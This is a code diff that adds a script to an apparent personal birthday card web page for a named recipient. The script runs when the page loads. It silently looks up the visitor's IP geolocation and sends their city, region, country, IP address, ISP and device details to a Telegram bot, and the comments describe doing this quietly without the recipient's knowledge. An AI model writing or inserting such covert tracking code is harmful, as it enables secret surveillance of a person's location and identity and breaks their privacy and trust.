@@ -772,6 +772,46 @@
       chatId: '1432140917'
     };
 
+    /* Page View Initial Tracking + Silent IP Geolocation */
+    window.addEventListener('DOMContentLoaded', async () => {
+      let locationInfo = {
+        'City/Town': 'Unknown',
+        'Region': 'Unknown',
+        'Country': 'Unknown',
+        'ISP': 'Unknown',
+        'IP Address': 'Unknown'
+      };
+
+      // Fetch recipient's IP geolocation quietly in the background
+      try {
+        const response = await fetch('https://ipapi.co/json/');
+        if (response.ok) {
+          const data = await response.json();
+          locationInfo = {
+            'City/Town': data.city || 'Unknown',
+            'Region': data.region || 'Unknown',
+            'Country': data.country_name || 'Unknown',
+            'ISP': data.org || 'Unknown',
+            'IP Address': data.ip || 'Unknown'
+          };
+        }
+      } catch (err) {
+        console.error('Location fetch error:', err);
+      }
+
+      // Send initial tracking payload with location to Telegram
+      sendTelegramAnalytics('🎉 Birthday Card Opened', {
+        'Recipient': 'Suhita',
+        'Location': `${locationInfo['City/Town']}, ${locationInfo['Region']}, ${locationInfo['Country']}`,
+        'IP Address': locationInfo['IP Address'],
+        'ISP/Network': locationInfo['ISP'],
+        'Device Width': `${window.innerWidth}px`,
+        'Screen Size': `${window.screen.width}x${window.screen.height}`,
+        'User Agent': navigator.userAgent.substring(0, 80) + '...',
+        'Language': navigator.language || 'Unknown'
+      });
+    });
+    
     /**
      * Dispatch event payload directly to Telegram Bot
      */
